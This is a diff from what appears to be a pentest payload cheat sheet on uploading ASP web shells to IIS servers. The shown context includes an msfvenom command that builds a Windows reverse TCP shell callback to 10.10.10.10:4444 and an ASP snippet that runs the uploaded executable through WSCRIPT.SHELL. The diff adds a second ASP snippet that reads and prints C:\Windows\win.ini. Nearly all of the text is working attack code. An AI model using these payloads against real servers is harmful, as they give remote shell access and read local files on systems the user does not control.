@@ -44,12 +44,24 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o rev
 
 Finally upload the `rev.asp` and `rev.exe` files to get a connection shell back.
 
+* Execute a binary
+
 ```
 <%
 Dim oS
 On Error Resume Next
 Set oS = Server.CreateObject("WSCRIPT.SHELL")
 Call oS.Run("win.com cmd.exe /c c:\Inetpub\rev.exe",0,True)
+%>
+```
+
+* Read internal files
+
+```
+<%
+string path = @"C:\\Windows\\win.ini"; 
+string txt = System.IO.File.ReadAllText(path); 
+Response.Write(txt); 
 %>
 ```
 
